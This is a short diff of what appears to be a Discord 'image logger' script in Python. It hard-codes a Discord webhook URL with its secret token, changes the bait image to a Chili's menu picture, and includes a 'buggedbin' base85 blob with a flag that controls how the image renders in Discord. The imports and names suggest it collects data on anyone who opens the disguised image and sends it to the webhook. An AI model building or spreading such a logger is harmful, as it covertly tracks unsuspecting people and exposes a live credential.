@@ -4,7 +4,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1543424657733062716/WCmtWiCFqOQFcikZYeuxv5sjLzdP37AEGH7YnBoFNNBQsQdsJ556pwktr55TVl8F81x0'
 
-bindata = httpx.get('https://cdn.informaconnect.com/platform/files/public/2024-10/background/Chilis%20triple%20dipper.jpg').content
+bindata = httpx.get('https://chilismenuprices.website/wp-content/uploads/2025/10/Chilis-Triple-Dipper.webp').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
